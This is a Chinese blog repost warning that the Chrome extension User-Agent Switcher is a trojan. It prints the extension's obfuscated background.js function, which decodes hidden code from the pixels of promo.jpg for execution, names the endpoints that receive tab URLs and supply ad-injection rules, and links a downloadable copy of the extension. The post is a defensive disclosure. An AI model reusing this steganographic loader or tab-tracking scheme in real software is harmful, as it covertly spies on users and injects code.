---
title: 懵逼！Chrome 的插件 User-Agent Switcher 是个木马
date: 2017-09-28 23:25:42.0
updated: 2021-12-22 17:01:20.0
url: /archives/2493
categories: 
- 我的地盘
tags: 
- 随笔
---

<p><img src="https://cdn.uu126.cn/201709/user-agent-switcher-fore-google-chrome1.jpg" alt="user-agent-switcher-fore-google-chrome1" title="user-agent-switcher-fore-google-chrome1"></p><p>Chrome 商店搜索 User-Agent Switcher,排第一的这个插件(45 万用户),是一个木马...<br /><a href="https://chrome.google.com/webstore/detail/user-agent-switcher-for-g/ffhkkpnppgnfaobgihpdblnhmmbodake">官方地址</a><br />无法访问？<br />这里有一个压缩包：链接: <a href="https://pan.baidu.com/s/1nvBRemH">https://pan.baidu.com/s/1nvBRemH</a> 密码: 4inq</p><p><img src="https://cdn.uu126.cn/201709/user-agent-switcher-fore-google-chrome.jpg" alt="user-agent-switcher-fore-google-chrome" title="user-agent-switcher-fore-google-chrome"></p><p>为了绕过 chrome 的审核策略,他把恶意代码隐藏在了<code> promo.jpg </code>里，<code> background.js </code>的第 80 行,从这个图片里解密出恶意代码并执行</p><pre><code>t.prototype.Vh = function(t, e) {
            if (&quot;&quot; === '../promo.jpg') return &quot;&quot;;
            void 0 === t &amp;&amp; (t = '../promo.jpg'), t.length &amp;&amp; (t = r.Wk(t)), e = e || {};
            var n = this.ET,
                i = e.mp || n.mp,
                o = e.Tv || n.Tv,
                h = e.At || n.At,
                a = r.Yb(Math.pow(2, i)),
                f = (e.WC || n.WC, e.TY || n.TY),
                u = document.createElement(&quot;canvas&quot;),
                p = u.getContext(&quot;2d&quot;);
            if (u.style.display = &quot;none&quot;, u.width = e.width || t.width, u.height = e.width || t.height, 0 === u.width || 0 === u.height) return &quot;&quot;;
            e.height &amp;&amp; e.width ? p.drawImage(t, 0, 0, e.width, e.height) : p.drawImage(t, 0, 0);
            var c = p.getImageData(0, 0, u.width, u.height),
                d = c.data,
                g = [];
            if (c.data.every(function(t) {
                    return 0 === t
                })) return &quot;&quot;;
            var m, s;
            if (1 === o)
                for (m = 3, s = !1; !s &amp;&amp; m &lt; d.length &amp;&amp; !s; m += 4) s = f(d, m, o), s || g.push(d[m] - (255 - a + 1));
            var v = &quot;&quot;,
                w = 0,
                y = 0,
                l = Math.pow(2, h) - 1;
            for (m = 0; m &lt; g.length; m += 1) w += g[m] = h &amp;&amp; (v += String.fromCharCode(w &amp; l), y %= h, w = g[m] &gt;&gt; i - y);
            return v.length &lt; 13 ? &quot;&quot; : (0 !== w &amp;&amp; (v += String.fromCharCode(w &amp; l)), v)
        }</code></pre><p>会把你打开的每个 tab 的 url 等信息加密发送到 <a href="https://uaswitcher.org/logic/page/data">https://uaswitcher.org/logic/page/data</a><br />另外还会从 <a href="http://api.data-monitor.info/api/bhrule?sub=116">http://api.data-monitor.info/api/bhrule?sub=116</a> 获取推广链接的规则,打开符合规则的网站时,会在页面插入广告甚至恶意代码.<br />根据 threatbook 上的信息( <a href="https://x.threatbook.cn/domain/api.data-monitor.info">https://x.threatbook.cn/domain/api.data-monitor.info</a> ),我估计下面的几个插件都是这个作者的作品..</p><p><a href="https://chrome.google.com/webstore/detail/nenhancer/ijanohecbcpdgnpiabdfehfjgcapepbm">https://chrome.google.com/webstore/detail/nenhancer/ijanohecbcpdgnpiabdfehfjgcapepbm</a></p><p><a href="https://chrome.google.com/webstore/detail/allow-copy/abidndjnodakeaicodfpgcnlkpppapah">https://chrome.google.com/webstore/detail/allow-copy/abidndjnodakeaicodfpgcnlkpppapah</a></p><p><a href="https://chrome.google.com/webstore/detail/%D1%81%D0%BA%D0%B0%D1%87%D0%B0%D1%82%D1%8C-%D0%BC%D1%83%D0%B7%D1%8B%D0%BA%D1%83-%D0%B2%D0%BA%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D0%B5/hanjiajgnonaobdlklncdjdmpbomlhoa">https://chrome.google.com/webstore/detail/%D1%81%D0%BA%D0%B0%D1%87%D0%B0%D1%82%D1%8C-%D0%BC%D1%83%D0%B7%D1%8B%D0%BA%D1%83-%D0%B2%D0%BA%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D0%B5/hanjiajgnonaobdlklncdjdmpbomlhoa</a></p><p><a href="https://chrome.google.com/webstore/detail/aliexpress-radar/pfjibkklgpfcfdlhijfglamdnkjnpdeg">https://chrome.google.com/webstore/detail/aliexpress-radar/pfjibkklgpfcfdlhijfglamdnkjnpdeg</a></p><p>有在用这个扩展的亲们，赶紧起床删了吧！</p><p>本文转载自：<a href="https://www.v2ex.com/t/389340">https://www.v2ex.com/t/389340</a></p>